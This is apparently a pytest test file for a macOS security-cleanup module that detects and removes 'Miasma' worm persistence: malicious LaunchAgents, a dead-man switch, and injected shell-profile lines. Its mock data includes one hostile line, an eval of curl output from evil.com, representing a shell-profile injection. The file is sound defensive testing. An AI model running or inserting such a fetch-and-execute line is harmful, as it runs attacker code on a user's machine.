import sys
import os
from pathlib import Path
from unittest.mock import patch, MagicMock

sys.path.insert(0, str(Path(__file__).parent.parent))

from rescue.models import SystemProfile, Platform, Severity, RiskLevel, Mode
from rescue.registry import discover_modules


def _make_profile(platform=Platform.DARWIN):
    return SystemProfile(
        platform=platform,
        os_name="macOS",
        os_version="15.2",
        architecture="arm64",
        cpu_model="Apple M2",
        cpu_cores=8,
        ram_bytes=16 * 1024**3,
    )


def _get_module():
    modules_dir = Path(__file__).parent.parent / "modules"
    modules = discover_modules(modules_dir)
    return next(m for m in modules if m.name == "ai_worm_persistence")


def test_module_discovered():
    mod = _get_module()
    assert mod.name == "ai_worm_persistence"
    assert mod.category == "security"
    assert mod.risk_level == RiskLevel.DESTRUCTIVE
    assert Platform.DARWIN in mod.platforms


def test_clean_system_no_findings():
    mod = _get_module()
    with patch("subprocess.run") as mock_run:
        mock_run.return_value = MagicMock(stdout="", returncode=0)
        with patch.object(Path, "exists", return_value=False):
            with patch.object(Path, "is_file", return_value=False):
                with patch.object(Path, "glob", return_value=[]):
                    result = mod.check(_make_profile())
    assert not result.has_issues


def test_detects_known_malicious_launchagent():
    """Detect Miasma's gh-token-monitor LaunchAgent."""
    mod = _get_module()

    plist_path = Path.home() / "Library" / "LaunchAgents" / "com.user.gh-token-monitor.plist"

    with patch("subprocess.run") as mock_run:
        mock_run.return_value = MagicMock(stdout="", returncode=0)
        with patch.object(Path, "exists") as mock_exists:
            mock_exists.side_effect = lambda: True
            with patch.object(
                mod,
                "_check_launchagents_darwin",
                return_value=[
                    {
                        "plist": str(plist_path),
                        "label": "com.user.gh-token-monitor",
                        "threat": "miasma",
                        "is_deadman_switch": True,
                    }
                ],
            ):
                result = mod.check(_make_profile())

    la_findings = [
        f for f in result.findings if f.data.get("check") == "malicious_launchagent"
    ]
    assert len(la_findings) > 0
    assert la_findings[0].severity == Severity.CRITICAL
    assert la_findings[0].data["confidence"] == "high"
    assert la_findings[0].data.get("is_deadman_switch") is True


def test_detects_shell_profile_injection():
    """Detect suspicious lines injected into shell profiles."""
    mod = _get_module()

    with patch("subprocess.run") as mock_run:
        mock_run.return_value = MagicMock(stdout="", returncode=0)
        with patch.object(Path, "exists", return_value=False):
            with patch.object(
                mod,
                "_check_shell_profiles",
                return_value=[
                    {
                        "file": "~/.bashrc",
                        "line": 'eval "$(curl -s https://evil.com/payload)"',
                        "line_number": 42,
                    }
                ],
            ):
                result = mod.check(_make_profile())

    shell_findings = [
        f for f in result.findings if f.data.get("check") == "shell_profile_injection"
    ]
    assert len(shell_findings) > 0
    assert shell_findings[0].data["confidence"] == "medium"


def test_fix_disables_deadman_switch_first():
    """fix() must disable dead-man switch BEFORE other remediation."""
    mod = _get_module()
    from rescue.models import CheckResult, Finding

    check = CheckResult(
        module_name="ai_worm_persistence",
        findings=[
            Finding(
                title="Miasma dead-man switch LaunchAgent",
                description="gh-token-monitor plist",
                severity=Severity.CRITICAL,
                category="security",
                data={
                    "check": "malicious_launchagent",
                    "confidence": "high",
                    "plist": str(
                        Path.home()
                        / "Library/LaunchAgents/com.user.gh-token-monitor.plist"
                    ),
                    "is_deadman_switch": True,
                    "threat": "miasma",
                },
            ),
            Finding(
                title="Miasma update-monitor LaunchAgent",
                description="update-monitor plist",
                severity=Severity.CRITICAL,
                category="security",
                data={
                    "check": "malicious_launchagent",
                    "confidence": "high",
                    "plist": str(
                        Path.home()
                        / "Library/LaunchAgents/com.user.update-monitor.plist"
                    ),
                    "is_deadman_switch": False,
                    "threat": "miasma",
                },
            ),
        ],
    )

    call_log = []

    def mock_run(cmd, **kwargs):
        call_log.append(cmd)
        return MagicMock(returncode=0)

    with patch("subprocess.run", side_effect=mock_run):
        with patch("os.remove"):
            fix = mod.fix(check, Mode.MANUAL)

    # Dead-man switch actions must come first
    assert len(fix.actions) >= 2
    deadman_idx = next(
        i for i, a in enumerate(fix.actions) if "dead-man" in a.title.lower() or "deadman" in a.title.lower()
    )
    other_idx = next(
        i
        for i, a in enumerate(fix.actions)
        if "update-monitor" in a.title.lower()
    )
    assert deadman_idx < other_idx


def test_subprocess_timeout_handled():
    mod = _get_module()
    import subprocess as sp

    with patch("subprocess.run", side_effect=sp.TimeoutExpired("cmd", 5)):
        with patch.object(Path, "exists", return_value=False):
            with patch.object(Path, "is_file", return_value=False):
                with patch.object(Path, "glob", return_value=[]):
                    result = mod.check(_make_profile())
    assert not result.has_issues
